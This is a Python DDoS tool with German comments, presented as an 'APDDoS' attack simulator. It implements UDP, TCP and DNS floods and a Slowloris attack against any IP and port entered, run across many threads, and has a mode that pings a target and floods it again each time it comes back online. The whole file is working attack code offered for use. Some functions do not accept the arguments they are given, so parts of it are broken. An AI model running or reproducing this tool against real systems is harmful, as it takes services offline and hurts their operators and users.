import os
import random
import socket
import threading
import time
import subprocess
from scapy.all import *

# Globale Variablen
packet_counter = 0  # Zähler für gesendete Pakete
stop_event = threading.Event()  # Ereignis zum Stoppen der Angriffe


# Funktion zur Überprüfung, ob Ziel erreichbar ist
def is_target_online(ip):
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return result.returncode == 0  # Rückgabewert 0 bedeutet erreichbar
    except Exception as e:
        print(f"Fehler bei der Ping-Überprüfung: {e}")
        return False


# UDP Flood
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            packet_counter += 1
        except:
            pass


# TCP Flood
def tcp_flood(ip, port, packet_size):
    global packet_counter
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(random._urandom(packet_size))
            packet_counter += 1
        except:
            pass
        finally:
            sock.close()


# DNS Flood
def dns_flood(ip):
    global packet_counter
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query, (ip, 53))
            packet_counter += 1
        except:
            pass


# Slowloris (TCP Keep-Alive)
def slowloris(ip, port):
    global packet_counter
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    while not stop_event.is_set():
        for sock in sockets:
            try:
                sock.send(b"X-a: Keep-alive\r\n")
                packet_counter += 1
            except:
                sockets.remove(sock)


# Menü zur Auswahl der Angriffe
def menu():
    os.system("clear")
    print("APDDoS Angriffssimulator")
    print("1 - UDP Flood")
    print("2 - TCP Flood")
    print("3 - DNS Flood")
    print("4 - Slowloris Attack")
    print("5 - Automatischer Angriff auf Ping-Ergebnisse")
    print("6 - Live-Dashboard und Statistiken")
    print("7 - Beenden")
    choice = int(input("Wähle eine Option: "))
    return choice


# Live-Dashboard
def dashboard():
    global packet_counter
    while not stop_event.is_set():
        print(f"\r[INFO] Gesendete Pakete: {packet_counter}", end="")
        time.sleep(1)


# Hauptprogramm
if __name__ == "__main__":
    while True:
        choice = menu()
        if choice in [1, 2, 3, 4]:
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: ")) if choice != 3 else 53
            packet_size = int(input("Paketgröße in Bytes (z. B. 1024): "))
            num_threads = int(input("Anzahl der Threads: "))

            attack_function = {
                1: udp_flood,
                2: tcp_flood,
                3: dns_flood,
                4: slowloris,
            }.get(choice)

            stop_event.clear()
            threads = [
                threading.Thread(target=attack_function, args=(ip, port, packet_size))
                for _ in range(num_threads)
            ]
            for thread in threads:
                thread.daemon = True
                thread.start()

            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.daemon = True
            dashboard_thread.start()

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()

        elif choice == 5:
            ip = input("Ziel-IP-Adresse: ")
            while True:
                if is_target_online(ip):
                    print(f"[INFO] Ziel {ip} ist online. Starte UDP-Flood...")
                    stop_event.clear()
                    thread = threading.Thread(target=udp_flood, args=(ip, 80, 1024))
                    thread.daemon = True
                    thread.start()
                    while is_target_online(ip):
                        time.sleep(1)
                    stop_event.set()
                    print(f"[INFO] Ziel {ip} ist offline. Warte...")
                time.sleep(5)

        elif choice == 6:
            print("Live-Dashboard wird gestartet.")
            dashboard_thread = threading.Thread(target=dashboard)
            dashboard_thread.start()

        elif choice == 7:
            print("[INFO] Programm beendet.")
            break

        else:
            print("[WARNUNG] Ungültige Eingabe.")
